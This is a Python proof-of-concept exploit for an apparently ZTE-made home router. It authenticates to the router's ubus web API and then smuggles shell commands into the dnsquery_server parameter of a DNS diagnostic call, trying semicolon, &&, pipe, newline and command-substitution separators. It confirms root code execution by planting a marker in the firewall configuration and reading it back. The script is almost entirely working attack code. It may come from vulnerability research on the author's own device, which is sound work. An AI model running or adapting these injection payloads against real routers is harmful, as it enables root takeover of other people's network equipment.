#!/usr/bin/env python3
"""DECISIVE: dnsquery_server command-injection -> root RCE confirmation.
Injects a marker into firewall uci config (root bypasses rpcd ACL), reads it
back via web uci.get. ROUTER_PW env."""
import os, json, time, hashlib, urllib.request, http.cookiejar

GW=os.environ.get("GW","192.168.0.1"); PW=os.environ["ROUTER_PW"]; ANON="0"*32
_J=http.cookiejar.CookieJar(); OP=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(_J))
def post(pl):
    req=urllib.request.Request(f"http://{GW}/ubus/?t={int(time.time()*1000)}",data=json.dumps(pl).encode(),
        headers={"Content-Type":"application/json","Accept":"*/*","User-Agent":"Mozilla/5.0",
        "Origin":f"http://{GW}/","Referer":f"http://{GW}/","Z-Mode":"1"})
    try:
        with OP.open(req,timeout=40) as r: return json.loads(r.read().decode(errors="replace"))
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except: return [{"error":{"code":e.code}}]
def call(s,o,m,p=None):
    for _ in range(3):
        r=post([{"jsonrpc":"2.0","id":1,"method":"call","params":[s,o,m,p or {}]}])[0]
        if not (isinstance(r,dict) and r.get("error",{}).get("code")==400): return r
        time.sleep(0.2)
    return r
def sha(s): return hashlib.sha256(s.encode()).hexdigest().upper()
def uci_get(s,section):
    r=call(s,"uci","get",{"config":"firewall","section":section})
    res=r.get("result"); 
    return res[1] if res and len(res)>1 else {}

salt=call(ANON,"zwrt_web","web_login_info",{})["result"][1]["zte_web_sault"]
s=call(ANON,"zwrt_web","web_login",{"password":sha(sha(PW)+salt)})["result"][1]["ubus_rpc_session"]
print("session",s[:8])

# find defaults section
fw=uci_get(s,"cfg01e63d")  # known from earlier
print("baseline firewall defaults _zmark:", fw.get("_zmark","<absent>"))

def trigger(server_payload, label):
    print(f"\n--- trigger: {label} ---")
    print("  server payload:", repr(server_payload))
    r=call(s,"zwrt_router.api","router_set_dnsquery_diagnose",
           {"dnsquery_target":"g.com","dnsquery_action":"check","dnsquery_server":server_payload})
    res=r.get("result"); print(f"  set -> [{'?' if not res else res[0]}]")

# Injection: run uci set as root via the nslookup command tail
MARKER="RCEOK_"+str(int(time.time())%100000)
inj=f"8.8.8.8; uci set firewall.cfg01e63d._zmark={MARKER}; uci commit firewall"
trigger(inj, "uci-mark injection (semicolon)")
time.sleep(3)
got=uci_get(s,"cfg01e63d").get("_zmark","<absent>")
print(f"  _zmark after inject = {got!r}")
if got==MARKER:
    print("\n  >>>>>>>>>>>  ROOT RCE CONFIRMED via dnsquery_server  <<<<<<<<<<")
else:
    # try alternate separators / quoting
    for inj2,label2 in [
        (f"8.8.8.8 && uci set firewall.cfg01e63d._zmark={MARKER}b && uci commit firewall","&&"),
        (f"8.8.8.8 | uci set firewall.cfg01e63d._zmark={MARKER}c; uci commit firewall","pipe"),
        (f"8.8.8.8\nuci set firewall.cfg01e63d._zmark={MARKER}d\nuci commit firewall","newline"),
        (f"$(uci set firewall.cfg01e63d._zmark={MARKER}e; uci commit firewall)","cmdsubst"),
    ]:
        trigger(inj2,label2); time.sleep(3)
        got=uci_get(s,"cfg01e63d").get("_zmark","<absent>")
        print(f"  _zmark = {got!r}")
        if got.startswith("RCEOK"):
            print("\n  >>>>>>>>>>>  ROOT RCE CONFIRMED  <<<<<<<<<<"); break
